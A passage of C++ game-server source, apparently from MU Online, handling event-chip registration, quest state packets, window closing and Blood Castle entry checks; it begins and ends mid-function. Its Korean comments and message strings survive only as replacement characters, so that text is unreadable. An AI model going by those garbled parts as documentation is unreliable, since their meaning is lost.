				strcpy(pMsg.szUID, lpObj->AccountID);
				strcpy(pMsg.szNAME, lpObj->Name);
				pMsg.wServerCode = gGameServerCode / 20;
				DataSendEventChip((char*)&pMsg, sizeof(pMsg));	
	
#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
				LogAddTD("[FriendShip Stone] [%s][%s] Register FriendShip Stone (Stone Pos:%d, Serial:%u)", 
#else
				LogAddTD("[FriendShip Stone] [%s][%s] Register FriendShip Stone (Stone Pos:%d, Serial:%d)", 
#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
					   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos, sitem->m_Number);
			}
			else 
			{	// �������� ����
				PMSG_REGEVENTCHIP_RESULT Result;
				PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

				Result.ChipCount = -1;
				Result.Type = 1;
				LogAddTD("[FriendShip Stone] [%s][%s] Not Found EventChip (Stone Pos: %d)", 
					   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
				DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
				lpObj->UseEventServer = FALSE;
			}
		}
		break;
#endif // EVENT_STONE_OF_FRIENDSHIP_20040206
	default :
		lpObj->UseEventServer = FALSE;
		return;
	}

#else
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpObj->UseEventServer )
		return;

	lpObj->UseEventServer = TRUE;

	int Pos = lpMsg->ChipPos+12;

	CItem* sitem = &lpObj->pInventory[Pos];	

	if( sitem->m_Type != MAKE_ITEMNUM(14, 21) )
	{	// �������� ����
		PMSG_REGEVENTCHIP_RESULT Result;
		PHeadSetB((LPBYTE)&Result, 0x95, sizeof(Result));

		Result.ChipCount = -1;
		LogAddTD("[EventChip] [%s][%s] Not Found EventChip (RegEventchip) #4 %d", 
			   lpObj->AccountID, lpObj->Name, lpMsg->ChipPos);
		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);		
		lpObj->UseEventServer = FALSE;
	}
	else
	{
		PMSG_REQ_REGISTER_EVENTCHIP	pMsg;
		PHeadSetB((LPBYTE)&pMsg, 0x02, sizeof(pMsg));	

		pMsg.iINDEX = aIndex;
		pMsg.Pos = Pos;
		strcpy(pMsg.szUID, lpObj->AccountID);
		DataSendEventChip((char*)&pMsg, sizeof(pMsg));		
	}
#endif
}

void GCGetMutoNumRecv(LPPMSG_GETMUTONUMBER lpMsg, int aIndex)
{
	if( gObj[aIndex].MutoNumber != 0 )
	{
		char msg[255];
		wsprintf(msg, "�̹� �簡���� ���ڰ� �ֽ��ϴ�");	
		GCServerMsgStringSend(msg, aIndex, 1);	
		return;
	}
	
	if( gObj[aIndex].UseEventServer )
		return;

	gObj[aIndex].UseEventServer = TRUE;


	if( !gObjFind10EventChip(aIndex) )
	{	// ������ ������ ����
		PMSG_GETMUTONUMBER_RESULT Result;
		PHeadSetB((LPBYTE)&Result, 0x96, sizeof(Result));	

		Result.MutoNum[0] = -1;
		Result.MutoNum[1] = 0;
		Result.MutoNum[2] = 0;
		DataSend(aIndex, (LPBYTE)&Result, Result.h.size);
		gObj[aIndex].UseEventServer = FALSE;
		return;
	}	

	PMSG_REQ_REGISTER_MUTONUM	pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0x03, sizeof(pMsg));	

	pMsg.iINDEX = aIndex;	
	strcpy(pMsg.szUID, gObj[aIndex].AccountID);
	DataSendEventChip((char*)&pMsg, sizeof(pMsg));
	
	LogAddTD("[EventChip] [%s][%s] Request MutoNumber", gObj[aIndex].AccountID, gObj[aIndex].Name);

}

void GCUseEndEventChipRescv( int aIndex)
{
	if( gObjIsConnectedGP(aIndex) == FALSE ) 
	{
		LogAddC(LOGC_RED, "error-L3 [%s][%d]", __FILE__,__LINE__);
		return;
	}

	if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type == I_EVENTCHIP )
	{
		gObj[aIndex].m_IfState.state = 0;	
		gObj[aIndex].m_IfState.type = 0;
		gObj[aIndex].m_IfState.use =  0;
	}	
}

void GCUseRenaChangeZenRecv( LPPMSG_EXCHANGE_EVENTCHIP lpMsg, int aIndex)
{
	if( gObj[aIndex].UseEventServer )
		return;
	gObj[aIndex].UseEventServer = TRUE;

	PMSG_REQ_RESET_EVENTCHIP pMsg;

	if (lpMsg->btType == 1)		// ����ȯ��
		PHeadSetB((LPBYTE)&pMsg, 0x09, sizeof(pMsg));
	else
		PHeadSetB((LPBYTE)&pMsg, 0x04, sizeof(pMsg));

	pMsg.iINDEX = aIndex;

	strcpy(pMsg.szUID, gObj[aIndex].AccountID);
	DataSendEventChip((char*)&pMsg, sizeof(pMsg));

	if (lpMsg->btType == 1)		// ����ȯ��
		LogAddTD("[EventChip] [%s][%s] Request Change Stones", gObj[aIndex].AccountID, gObj[aIndex].Name);
	else
		LogAddTD("[EventChip] [%s][%s] Request Change Rena", gObj[aIndex].AccountID, gObj[aIndex].Name);
}


#ifdef NEW_SKILL_FORSKYLAND
void CGRequestQuestInfo(int aIndex)
{	
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	if( lpObj->m_SendQuestInfo )
	{	// ����Ʈ ������ ������ �ִ�
		return;
	}

	int questcount = g_QuestInfo.GetQeustCount();
	int	foundquest = 0;

	PMSG_SEND_QEUSTINFO pMsg;
	memcpy(pMsg.State, lpObj->m_Quest, MAX_DBQUEST);
	
	LPQUEST_INFO lpQuestInfo;
	int i;
	for( i = 0; i < MAX_QUEST; i++ )
	{
		lpQuestInfo = g_QuestInfo.GetQuestInfo(i);
		if( lpQuestInfo )	
		{
			foundquest++;
			if( foundquest == questcount )		
				break;
		}
	}

	int	iSize = 3+(i/4)+2;
	PHeadSetB((LPBYTE)&pMsg, 0xA0, iSize);
	pMsg.Count = i;

	DataSend(aIndex, (LPBYTE)&pMsg, iSize);

	lpObj->m_SendQuestInfo = TRUE;

#ifdef AUTH_GAMESERVER_CHECKKEY
	if( szAuthKey[8] != AUTH_CHECK_08 )
		DestroyGIocp();
#endif
}

void GCSendQuestInfo(int aIndex, int QuestIndex)
{
	CGRequestQuestInfo(aIndex);

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	PMSG_SETQUEST pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0xA1, sizeof(pMsg));

	pMsg.QuestIndex = QuestIndex;
	pMsg.State = g_QuestInfo.GetQuestStateBYTE(lpObj, QuestIndex);

	if( pMsg.State != 0 )
		DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}

void CGSetQuestState(LPPMSG_SETQUEST lpMsg, int aIndex)
{	
	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	PMSG_SETQUEST_RESULT pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0xA2, sizeof(pMsg));

	pMsg.QuestIndex = lpMsg->QuestIndex;
	// ���¸� �����Ѵ�
	pMsg.Result = g_QuestInfo.SetQuestState(lpObj, lpMsg->QuestIndex, lpMsg->State);
	pMsg.State = g_QuestInfo.GetQuestStateBYTE(lpObj, lpMsg->QuestIndex);
	
	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
}


void GCSendQuestPrize(int aIndex, BYTE Type, BYTE Count)
{
	CGRequestQuestInfo(aIndex);

	LPOBJECTSTRUCT lpObj = &gObj[aIndex];

	PMSG_SETQUEST_PRIZE pMsg;
	PHeadSetB((LPBYTE)&pMsg, 0xA3, sizeof(pMsg));

	pMsg.NumberH	= HIBYTE(lpObj->m_Index);
	pMsg.NumberL	= LOBYTE(lpObj->m_Index);

	pMsg.Type = Type;
	pMsg.Count = Count;

	DataSend(aIndex, (LPBYTE)&pMsg, sizeof(pMsg));
	MsgSendV2(lpObj, (LPBYTE)&pMsg, sizeof(pMsg));
}

void CGCloseWindow(int aIndex)
{
	if( gObj[aIndex].m_IfState.use && gObj[aIndex].m_IfState.type != 0 )
	{
#ifdef CHAOS_BOX_ITEMCOPY_FIX_20041112_FOR_CHS
		if( gObj[aIndex].m_IfState.type == I_CHAOSBOX )	// ī���� ������ ���⼭ ������ �ȵ�
		{
			return;
		}
#endif

#ifdef SECOND_QUEST
		if( gObj[aIndex].m_IfState.type == I_QUEST && gObj[aIndex].TargetShopNumber == NPC_QEUSTNPC2 )
		{	// ����Ʈ â�� ���� ���ְ� NPC�� 2���� ����Ʈ NPC�̸�		
			gQeustNpcTeleport.TalkRefDel();
			gObj[aIndex].TargetShopNumber = -1;	
		}
#endif
		if( gObj[aIndex].m_IfState.type == I_SHOP )	// ���� �ŷ����̾��ٸ�..
		{
			gObj[aIndex].TargetShopNumber = -1;	
		}

#ifdef TRADE_BUG_FIX_CLOSE_WINDOWS_20040727		
		if( gObj[aIndex].m_IfState.type == I_TRADE )
		{
			CGTradeCancelButtonRecv(aIndex);
		}
		
		if( gObj[aIndex].m_IfState.type == I_WAREHOUSE )
		{
			CGWarehouseUseEnd(aIndex);
		}				
#endif

#ifdef DARKLORD_WORK	// ���û� �������̾��ٸ�
		if( gObj[aIndex].m_IfState.type == I_DARK_TRAINER )
		{
			g_MixSystem.ChaosBoxInit(&gObj[aIndex]);
			gObjInventoryCommit(aIndex);
		}
#endif

#ifdef ADD_NEW_WEAPON_FOR_CASTLE_01_20041116	
		if( gObj[aIndex].m_IfState.type == I_CS_MACHINE_ATTACK 
			|| gObj[aIndex].m_IfState.type == I_CS_MACHINE_DEFENSE )
		{
			
		}

#endif

#ifdef MODIFY_PCBANGPOINTSHOP_CLOSEWINDOWS_BUGFIX_20080218
		if( gObj[aIndex].m_IfState.type == I_PCBANG_POINT_SHOP )	// �Ǿ������ �ŷ����̾��ٸ�..
		{
			gObj[aIndex].TargetShopNumber = -1;	
		}
#endif	// MODIFY_PCBANGPOINTSHOP_CLOSEWINDOWS_BUGFIX_20080218
		
		gObj[aIndex].m_IfState.state = 0;	
		gObj[aIndex].m_IfState.type = 0;
		gObj[aIndex].m_IfState.use =  0;

#ifdef AUTH_GAMESERVER_CHECKKEY
	if( szAuthKey[7] != AUTH_CHECK_07 )
		DestroyGIocp();
#endif
	}
}

#endif


#ifdef FOR_BLOODCASTLE

// [0x9A] ����ĳ���� ������ ��û�Ѵ�.
void CGRequestEnterBloodCastle(LPPMSG_REQ_MOVEBLOODCASTLE lpMsg, int iIndex)
{
	if (!CHECK_LIMIT(iIndex, MAX_OBJECT))
	{
		LogAdd("return %s %d", __FILE__, __LINE__);
		return;
	}

	BYTE btBridgeNumber = lpMsg->iBridgeNumber-1;
	BYTE btInvisibleCourtItemPos = lpMsg->iItemPos;
	INT	 iITEM_LEVEL = 0;
	DWORD dwITEM_SERIAL = 0;

	PMSG_RESULT_MOVEBLOODCASTLE pResult;
	PHeadSetB((LPBYTE)&pResult, 0x9A, sizeof(pResult));
	pResult.Result = 0;

	if ((gObj[iIndex].Type != OBJTYPE_CHARACTER) || (gObj[iIndex].Connected <= 2)) {
		return;
	}

#ifdef BLOOD_DEVILSQUARE_TRADE_BUG_FIX	
	// *> . ���� �������̽��� ��� ������ üũ�Ѵ�.
	if (gObj[iIndex].m_IfState.use != 0 && gObj[iIndex].m_IfState.type != I_ETCWINDOW ) {
		return;
	}
#endif

#ifdef ADD_PK_USER_ENTER_LIMIT_EVENT_MAP_20060411
	// *> . ī�� ������ ������ �� ����.
#ifdef UPDATE_PK_SYSTEM_20070302	// ī�� ������ ������ �� ����.
	BOOL	PKFlag = FALSE;
	if(gObj[iIndex].PartyNumber >= 0)	// ��Ƽ�� ���Ұ��
	{
		if( gParty.GetPKPartyPenalty(gObj[iIndex].PartyNumber) >= PK_LEVEL_DEFAULT+2)
		{
			PKFlag = TRUE;
		}
	}
	else
	{
		if(gObj[iIndex].m_PK_Level >= PK_LEVEL_DEFAULT+1)
		{
			PKFlag = TRUE;
		}
	}
	
	if(PKFlag == TRUE)
#else	// UPDATE_PK_SYSTEM_20070302
	if( gObj[iIndex].m_PK_Level >= PK_LEVEL_DEFAULT + 1 )
#endif	// UPDATE_PK_SYSTEM_20070302
	{
		pResult.Result = 7;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
#endif

	// 1 . ������ �� �� �ִ� �ð����� Ȯ���Ѵ�.
	if (!g_BloodCastle.CheckCanEnter(btBridgeNumber)) {
		pResult.Result = 2;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}


	// 2 . �ɸ����� �κ��� �ش� ��ġ�� ������� �������� �ִ��� Ȯ���Ѵ�.
	if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].IsItem() == TRUE )
	{
		if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM(13, 18) )	// ������䰡 �����Ѵٸ�
		{
			iITEM_LEVEL = gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Level;				// ������ ������ ��´�.
			dwITEM_SERIAL = gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Number;			// ������ �ø����� ��´�.
			if (!CHECK_LIMIT(iITEM_LEVEL, MAX_BLOODCASTLE_BRIDGE_COUNT+1)) {					// 0 < iITEM_LEVEL < �ִ�ٸ����� + 1
				pResult.Result = 1;
				DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
		}
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		// ���� ĳ�� ���� ����� �߰�
		else if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 47 )
			&& gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability > 0
			   )
		{
#ifdef MODIFY_MASTER_LEVEL_SYSTEM_20080414
			if( g_MasterLevelSystem.IsMasterLevelUser( &gObj[iIndex] ) )
			{
				iITEM_LEVEL		= MAX_BLOODCASTLE_BRIDGE_COUNT;
				//iITEM_LEVEL	= MAX_DEVILSQUARE - 1;
			} else {
#endif // MODIFY_MASTER_LEVEL_SYSTEM_20080414
			for( int i = 0 ; i < MAX_BLOODCASTLE_BRIDGE_COUNT + 1 ; i++ )
			{
				if( g_BloodCastle.CheckEnterLevel( iIndex, i + 1 ) == 0 )
				{
					iITEM_LEVEL = i + 1;
					break;
				}
			}
#ifdef MODIFY_MASTER_LEVEL_SYSTEM_20080414
			}
#endif // MODIFY_MASTER_LEVEL_SYSTEM_20080414
			
			dwITEM_SERIAL = gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Number;
			if( !CHECK_LIMIT( iITEM_LEVEL, MAX_BLOODCASTLE_BRIDGE_COUNT+1 ) )
			{
				pResult.Result = 1;
				DataSend( iIndex, (LPBYTE)&pResult, pResult.h.size );
				return;
			}
		}
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		else {
			pResult.Result = 1;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
	}
	else {
		pResult.Result = 1;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	
#ifdef	BLOODCASTLE_CHECK_ENTERCOUNT_20040304
	// *> . ����ĳ���� �Ϸ� ������� �����Ѵ�.
	BOOL bBCENTER_ANYWAY = TRUE;
#if 0 // BLOOD CASTLE ENTER COUNT
	if (!DevilSquareEventConnect) {
		if (IsDevilSquareEventConnected) {
			// ��ŷ������ �������� ���θ� �����.
			PMSG_REQ_BLOODCASTLEENTERCHECK pMsg;
			pMsg.h.c = 0xC1;
			pMsg.h.headcode = 0x08;
			pMsg.h.size = sizeof(pMsg);
			memcpy (pMsg.AccountID, gObj[iIndex].AccountID, MAX_IDSTRING);
			memcpy (pMsg.GameID, gObj[iIndex].Name, MAX_IDSTRING);
			pMsg.ServerCode = gGameServerCode;
			pMsg.iObjIndex = iIndex;
			pMsg.iItemPos = lpMsg->iItemPos;
			pMsg.iItemLevel = iITEM_LEVEL;
			pMsg.iBridgeNumber = lpMsg->iBridgeNumber;

			wsRServerCli.DataSend((char*)&pMsg, pMsg.h.size);
		
			bBCENTER_ANYWAY = FALSE;
		}
		else {
			BOOL bRETVAL = GMRankingServerConnect(gDevilSquareEventServerIp, WM_USER+12);	// WM_ASS_RANKINGCLIMSG
			if (bRETVAL == FALSE) {
				bBCENTER_ANYWAY = TRUE;
			}
			else {
				// ��ŷ������ �������� ���θ� �����.
				PMSG_REQ_BLOODCASTLEENTERCHECK pMsg;
				pMsg.h.c = 0xC1;
				pMsg.h.headcode = 0x08;
				pMsg.h.size = sizeof(pMsg);
				memcpy (pMsg.AccountID, gObj[iIndex].AccountID, MAX_IDSTRING);
				memcpy (pMsg.GameID, gObj[iIndex].Name, MAX_IDSTRING);
				pMsg.ServerCode = gGameServerCode;
				pMsg.iObjIndex = iIndex;
				pMsg.iItemPos = lpMsg->iItemPos;
				pMsg.iItemLevel = iITEM_LEVEL;
				pMsg.iBridgeNumber = lpMsg->iBridgeNumber;

				wsRServerCli.DataSend((char*)&pMsg, pMsg.h.size);
				
				bBCENTER_ANYWAY = FALSE;
			}
		}
	}
	else
	{
		bBCENTER_ANYWAY = TRUE;
	}
#endif

	// ���࿡ ������ ������Ѿ� �ϴ� �������� üũ�Ѵ�.
	if (bBCENTER_ANYWAY == TRUE) {
		
		// 3 . �������� �����ϹǷ� ���� �ش� �ɸ��� ������ �´��� Ȯ���Ѵ�.
		INT iRESULT = g_BloodCastle.CheckEnterLevel(iIndex, iITEM_LEVEL);

		if (!iRESULT) {					// ������ �´�.
			pResult.Result = 0;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		}
		else if (iRESULT == -1) {		// �� ������ ����.
			pResult.Result = 4;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
		else if (iRESULT == 1) {		// �� ������ ����.
			pResult.Result = 3;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
		else return;					// �ٸ� ������.

#ifdef BLOODCASTLE_EVENT_5TH_20050531
		// *> . ��Ƽ���� �ΰ����� �ʰų� ��Ƽ���� 3�� ���϶�� ������ �� ����.
/*
		if( gObj[iIndex].PartyNumber >= 0 )
		{
			int iPartyUsers = gParty.GetCount(gObj[iIndex].PartyNumber);
			if (iPartyUsers < 3) {
				// ��Ƽ���� 3�� ���϶�� ������ �� ����.
				pResult.Result = 5;		// !!! . ���ο� ����� �ʿ�
				DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
				return;
			}
		}
		else {
			// ��Ƽ�� ���ٸ� ������ �� ����.
			pResult.Result = 5;			// !!! . ���ο� ����� �ʿ�
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}
*/
#endif
		
/*
	#ifdef APPLY_TESTSERVER
		// 4 . Ȥ�� ���� ��õ���� ���빫�⸦ �����ϰ� �ִ��� Ȯ���Ѵ�. -> ������ ����
		if (g_BloodCastle.CheckUserHaveUlimateWeapon(iIndex)) {
			LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) tried to Enter Castle but Have Ultimate Weapon", 
				iITEM_LEVEL,
				gObj[iIndex].AccountID,
				gObj[iIndex].Name
				);

			PMSG_NOTICE	pNotice;

#ifdef MODIFY_NOTICE_20040325
			TNotice::MakeNoticeMsg( &pNotice, 1, "���빫�⸦ �����ϰ� �����Ƿ� ����ĳ���� �����Ͻ� �� �����ϴ�." );
#else
			pNotice.type = 1;
			strcpy(pNotice.Notice, "���빫�⸦ �����ϰ� �����Ƿ� ����ĳ���� �����Ͻ� �� �����ϴ�.");
			PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif

			DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);

			return;
		}
	#endif	
*/


		// *> . ���� ��Ű�� ���� �ش� ĳ���� ����� �� ������ ���� �ο��� �ɷ�����.
		g_BloodCastle.CheckUsersOnConnect(iITEM_LEVEL-1);


		// 5 . �ش� ���忡 �ο����ѿ� �ɸ��� �ʴ��� Ȯ���Ѵ�.
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
		INT iBC_INDEX = g_BloodCastle.EnterUserBridge(btBridgeNumber, iIndex);
#else
		INT iBC_INDEX = g_BloodCastle.EnterUserBridge(iITEM_LEVEL-1, iIndex);
#endif

		if (iBC_INDEX == -1) {
			pResult.Result = 5;
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
			return;
		}

		// !!> ���� -> ������ ���ְ� ����ڸ� ���� ĳ���� �̵���Ų��.

		// *> . ������ ����
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
		// ���� ĳ�� ���� �����
		if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 18 )
			|| ( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 47 ) && gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability == 1 )
		  )
		{
			gObjInventoryDeleteItem(iIndex, btInvisibleCourtItemPos);
			GCInventoryItemDeleteSend(iIndex, btInvisibleCourtItemPos, 1);
			DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		}
		else if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 47 )
			&& gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability > 1
			)
		{
			gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability--;

			GCItemDurSend2( iIndex, btInvisibleCourtItemPos, gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability, 0 );
		}
#else
		gObjInventoryDeleteItem(iIndex, btInvisibleCourtItemPos);
		GCInventoryItemDeleteSend(iIndex, btInvisibleCourtItemPos, 1);
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
#endif // ADD_PCS_EVENT_MAP_FREE_TICKET_20070110

		// *> . ������� ���� ĳ������ �ʱ�ȭ
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
		gObj[iIndex].m_cBloodCastleIndex = btBridgeNumber;
#else
		gObj[iIndex].m_cBloodCastleIndex = iITEM_LEVEL-1;
#endif
		gObj[iIndex].m_cBloodCastleSubIndex = iBC_INDEX;
		gObj[iIndex].m_iBloodCastleEXP = 0;

	#ifdef BLOOD_DEVILSQUARE_TRADE_BUG_FIX
		gObj[iIndex].m_IfState.state = 0;	
		gObj[iIndex].m_IfState.type = 0;
		gObj[iIndex].m_IfState.use =  0;
	#endif
		// *> . ��Ƽ�� �ΰ� �־��ٸ� ��Ƽ��  ������ Ż���Ŵ
/*		if( gObj[iIndex].PartyNumber >= 0 )
		{
			PMSG_PARTYDELUSER pMsg;
			
			int pindex = gParty.GetIndex(gObj[iIndex].PartyNumber, iIndex, gObj[iIndex].DBNumber);
			if( pindex >= 0 )
			{
				pMsg.Number = pindex;
				CGPartyDelUser( &pMsg, iIndex);
			}
		}
*/
		// *> . ������ ����Ͽ� ����Ʈ �����۵��� �����Ѵ�.
		g_BloodCastle.SearchUserDeleteQuestItem(iIndex);

		// *> . ����� ���� ĳ���� �̵�
		CHAR szTemp [256];
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
		wsprintf(szTemp, lMsg.Get(1171), btBridgeNumber+1);			// "����� �� %d ����ĳ���� ���̽��ϴ�."
#else
		wsprintf(szTemp, lMsg.Get(1171), iITEM_LEVEL);				// "����� �� %d ����ĳ���� ���̽��ϴ�."
#endif
		GCServerMsgStringSend(szTemp, iIndex, 1);

#ifdef BLOODCASTLE_EXTEND_20040314
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
		if (btBridgeNumber+1 == iITEM_LEVEL) {
			switch(iITEM_LEVEL) {
			case 1 :		// 1ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_1);
				break;
			case 2 :		// 2ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_2);
				break;
			case 3 :		// 3ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_3);
				break;
			case 4 :		// 4ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_4);
				break;
			case 5 :		// 5ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_5);
				break;
			case 6 :		// 6ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_6);
				break;
			case 7 :		// 7ĳ��
				gObjMoveGate(iIndex, GATE_BLOODCASTLE_7);
				break;
			}
		}
		else if (btBridgeNumber+1 == 7 && iITEM_LEVEL == 6) {
			// 7ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_7);
		}
#else
		switch(iITEM_LEVEL) {
		case 1 :		// 1ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_1);
			break;
		case 2 :		// 2ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_2);
			break;
		case 3 :		// 3ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_3);
			break;
		case 4 :		// 4ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_4);
			break;
		case 5 :		// 5ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_5);
			break;
		case 6 :		// 6ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_6);
			break;
		case 7 :		// 7ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_7);
			break;
#ifdef ADD_BLOODCASTLE_FOR_MASTER_LEVEL_20071010	// 8ĳ�� �̵�
		case 8 :		// 8ĳ��
			gObjMoveGate(iIndex, GATE_BLOODCASTLE_8);
			break;
#endif			
		}
#endif
#else
		gObjMoveGate(iIndex, GATE_BLOODCASTLE_1 + iITEM_LEVEL - 1);	// �����δ� �ش� �ٸ��� ���Ƿ� �̵�
#endif

#ifdef EXTEND_LOG_SYSTEM_06_20070308
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
		LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%u), PCRoom:%d", 
	#else
		LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%d), PCRoom:%d", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
			iITEM_LEVEL, 
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			dwITEM_SERIAL,
			gObj[iIndex].m_bPCBangUser
			);
#else
	#ifdef MODIFY_ITEM_SERIAL_EXPAND_20080227
		LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%u)", 
	#else
		LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) Entered Blood Castle (Invisible Cloak Serial:%d)", 
	#endif // MODIFY_ITEM_SERIAL_EXPAND_20080227
			iITEM_LEVEL, 
			gObj[iIndex].AccountID,
			gObj[iIndex].Name,
			dwITEM_SERIAL
			);
#endif // EXTEND_LOG_SYSTEM_06_20070308
	}


#else
	
	// 3 . �������� �����ϹǷ� ���� �ش� �ɸ��� ������ �´��� Ȯ���Ѵ�.
	INT iRESULT = g_BloodCastle.CheckEnterLevel(iIndex, iITEM_LEVEL);

	if (!iRESULT) {					// ������ �´�.
		pResult.Result = 0;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
	}
	else if (iRESULT == -1) {		// �� ������ ����.
		pResult.Result = 4;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	else if (iRESULT == 1) {		// �� ������ ����.
		pResult.Result = 3;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}
	else return;					// �ٸ� ������.


/*
#ifdef APPLY_TESTSERVER
	// 4 . Ȥ�� ���� ��õ���� ���빫�⸦ �����ϰ� �ִ��� Ȯ���Ѵ�. -> ������ ����
	if (g_BloodCastle.CheckUserHaveUlimateWeapon(iIndex)) {
		LogAddTD("[Blood Castle] (%d) (Account:%s, Name:%s) tried to Enter Castle but Have Ultimate Weapon", 
			iITEM_LEVEL,
			gObj[iIndex].AccountID,
			gObj[iIndex].Name
			);

		PMSG_NOTICE	pNotice;

#ifdef MODIFY_NOTICE_20040325
		TNotice::MakeNoticeMsg( &pNotice, 1, "���빫�⸦ �����ϰ� �����Ƿ� ����ĳ���� �����Ͻ� �� �����ϴ�." );
#else
		pNotice.type = 1;
		strcpy(pNotice.Notice, "���빫�⸦ �����ϰ� �����Ƿ� ����ĳ���� �����Ͻ� �� �����ϴ�.");
		PHeadSetB((LPBYTE)&pNotice, 0x0D, 4+(strlen(pNotice.Notice)+1));
#endif

		DataSend(iIndex, (LPBYTE)&pNotice, pNotice.h.size);

		return;
	}
#endif	
*/


	// 5 . �ش� ���忡 �ο����ѿ� �ɸ��� �ʴ��� Ȯ���Ѵ�.
#ifdef USER_ENTER_BLOODCASTLE7_WITH6_20040330
	INT iBC_INDEX = g_BloodCastle.EnterUserBridge(btBridgeNumber, iIndex);
#else
	INT iBC_INDEX = g_BloodCastle.EnterUserBridge(iITEM_LEVEL-1, iIndex);
#endif

	if (iBC_INDEX == -1) {
		pResult.Result = 5;
		DataSend(iIndex, (LPBYTE)&pResult, pResult.h.size);
		return;
	}

	// !!> ���� -> ������ ���ְ� ����ڸ� ���� ĳ���� �̵���Ų��.

	// *> . ������ ����
#ifdef ADD_PCS_EVENT_MAP_FREE_TICKET_20070110
	// ���� ĳ�� ���� �����
	if( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 18 )
		|| ( gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Type == MAKE_ITEMNUM( 13, 47 ) && gObj[iIndex].pInventory[btInvisibleCourtItemPos].m_Durability == 1 )
	  )
	{
		gObjInventoryDeleteItem(iIndex, btInvisibleCourtItemPos);
		GCInventoryItemDeleteSend(iIndex, btInvisibleCourtItemPos, 1);
